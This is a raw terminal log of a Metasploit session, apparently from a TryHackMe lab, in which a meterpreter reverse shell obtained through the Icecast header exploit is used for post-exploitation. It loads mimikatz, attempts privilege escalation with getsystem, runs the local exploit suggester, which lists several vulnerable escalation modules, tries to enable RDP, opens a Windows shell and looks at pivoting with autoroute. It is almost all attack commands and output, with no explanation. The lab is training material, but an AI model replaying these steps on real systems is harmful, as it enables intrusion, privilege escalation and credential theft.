+[0mLoading extension kiwi...
+  .#####.   mimikatz 2.2.0 20191125 (x86/windows)
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
+  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
+
+[1m[33m[!][0m Loaded x86 Kiwi on an x64 architecture.
+
+Success.
+[4mmeterpreter[0m > [[K
+[0m[4mmeterpreter[0m > getsystem
+[0m[1m[31m[-][0m priv_elevate_getsystem: Operation failed: The environment is incorrect. The following was attempted:
+[1m[31m[-][0m Named Pipe Impersonation (In Memory/Admin)
+[1m[31m[-][0m Named Pipe Impersonation (Dropper/Admin)
+[1m[31m[-][0m Token Duplication (In Memory/Admin)
+[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > getprivs
+[0m
+Enabled Process Privileges
+==========================
+
+Name
+----
+SeChangeNotifyPrivilege
+SeIncreaseWorkingSetPrivilege
+SeShutdownPrivilege
+SeTimeZonePrivilege
+SeUndockPrivilege
+
+[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > upload
+[0mUsage: upload [options] src1 src2 src3 ... destination
+
+Uploads local files and directories to the remote machine.
+
+OPTIONS:
+
+    -h        Help banner
+    -r        Upload recursively
+
+[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > ipconfig
+[0m
+Interface  1
+============
+Name         : Software Loopback Interface 1
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 4294967295
+IPv4 Address : 127.0.0.1
+IPv4 Netmask : 255.0.0.0
+IPv6 Address : ::1
+IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
+
+
+Interface 12
+============
+Name         : Microsoft ISATAP Adapter
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 1280
+IPv6 Address : fe80::5efe:a0a:62ae
+IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
+
+
+Interface 13
+============
+Name         : AWS PV Network Device #0
+Hardware MAC : 02:fd:48:bd:97:f5
+MTU          : 9001
+IPv4 Address : 10.10.98.174
+IPv4 Netmask : 255.255.0.0
+IPv6 Address : fe80::f571:b317:a01a:c894
+IPv6 Netmask : ffff:ffff:ffff:ffff::
+
+[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > run [K[K[K[Kbackground
+[0m[1m[34m[*][0m Backgrounding session 1...
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> sessions
+[0m
+Active sessions
+===============
+
+  Id  Name  Type                     Information             Connection
+  --  ----  ----                     -----------             ----------
+  1         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.9.185.104:4444 -> 10.10.98.174:49205 (10.10.98.174)
+
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> run[K[K[Ksessions 0[K-i 1
+[0m[1m[34m[*][0m Starting interaction with 1...
+
+[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > ru [Kn post/windows/gather
+[0m
+[1m[31m[-][0m The specified meterpreter session script could not be found: post/windows/gather
+[4mmeterpreter[0m > run post/windows/gather/checkvm
+[0m
+[1m[34m[*][0m Checking if DARK-PC is a Virtual Machine ...
+[1m[32m[+][0m This is a Xen Virtual Machine
+[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > run post/mi[Kulti/recon/local_exploiy[Kt_suggester
+[0m
+[1m[34m[*][0m 10.10.98.174 - Collecting local exploits for x86/windows...
+
+[1m[34m[*][0m 10.10.98.174 - 34 exploit checks are being tried...
+[1m[32m[+][0m 10.10.98.174 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+nil versions are discouraged and will be deprecated in Rubygems 4
+[1m[32m[+][0m 10.10.98.174 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
+[1m[32m[+][0m 10.10.98.174 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
+[1m[32m[+][0m 10.10.98.174 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
+[1m[32m[+][0m 10.10.98.174 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
+[1m[32m[+][0m 10.10.98.174 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[1m[32m[+][0m 10.10.98.174 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[1m[32m[+][0m 10.10.98.174 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
+[1m[32m[+][0m 10.10.98.174 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > [K[4mmeterpreter[0m > [K[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > run post/windows/manage/enable_rdp
+[0m
+[1m[31m[-][0m Insufficient privileges, Remote Desktop Service was not modified
+[1m[34m[*][0m For cleanup execute Meterpreter resource file: /root/.msf4/loot/20201031223649_default_10.10.98.174_host.windows.cle_574816.txt
+[4mmeterpreter[0m > [K[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > shell
+[0mProcess 2392 created.
+Channel 4 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Program Files (x86)\Icecast2 Win32>
+
+C:\Program Files (x86)\Icecast2 Win32>exit
+[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > auto[K[K[K[K
+[0m[4mmeterpreter[0m > run autorum[Kn -h
+[0m
+[1m[31m[-][0m The specified meterpreter session script could not be found: autorun
+[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > run autoroute -h
+[0m
+[1m[33m[!][0m Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+[1m[33m[!][0m Example: run post/multi/manage/autoroute OPTION=value [...]
+[1m[34m[*][0m Usage:   run autoroute [-r] -s subnet -n netmask
+[1m[34m[*][0m Examples:
+[1m[34m[*][0m   run autoroute -s 10.1.1.0 -n 255.255.255.0  # Add a route to 10.10.10.1/255.255.255.0
+[1m[34m[*][0m   run autoroute -s 10.10.10.1                 # Netmask defaults to 255.255.255.0
+[1m[34m[*][0m   run autoroute -s 10.10.10.1/24              # CIDR notation is also okay
+[1m[34m[*][0m   run autoroute -p                            # Print active routing table
+[1m[34m[*][0m   run autoroute -d -s 10.10.10.1              # Deletes the 10.10.10.1/255.255.255.0 route
+[1m[34m[*][0m Use the "route" and "ipconfig" Meterpreter commands to learn about available routes
+[1m[31m[-][0m Deprecation warning: This script has been replaced by the post/multi/manage/autoroute module
+[4mmeterpreter[0m > 172,[K[K[K[Kbc[K[K
+[0m[4mmeterpreter[0m > background
+[0m[1m[34m[*][0m Backgrounding session 1...
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> sessions 
+[0m
+Active sessions
+===============
+
+  Id  Name  Type                     Information             Connection
+  --  ----  ----                     -----------             ----------
+  1         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.9.185.104:4444 -> 10.10.98.174:49205 (10.10.98.174)
+
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> search sock4a
+[0m[1m[31m[-][0m No results from search
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> search sock4as4a
+[0m
+Matching Modules
+================
+
+   #  Name                      Disclosure Date  Rank    Check  Description
+   -  ----                      ---------------  ----    -----  -----------
+   0  auxiliary/server/[45msocks4a[0m                   normal  No     [45mSocks4a[0m Proxy Server
+
+
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> exit
+[0m[1m[34m[*][0m You have active sessions open, to exit anyway type "exit -y"
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> exit -y
+[0m]0;root@Pentest: /home/joaof/TryJao/TryHackMe/Metasploit[1;31mroot@Pentest[00m:[1;34m/home/joaof/TryJao/TryHackMe/Metasploit[00m# 
+]0;root@Pentest: /home/joaof/TryJao/TryHackMe/Metasploit[1;31mroot@Pentest[00m:[1;34m/home/joaof/TryJao/TryHackMe/Metasploit[00m# exit
+exit
+
+Script done on 2020-10-31 22:47:30-03:00 [COMMAND_EXIT_CODE="0"]
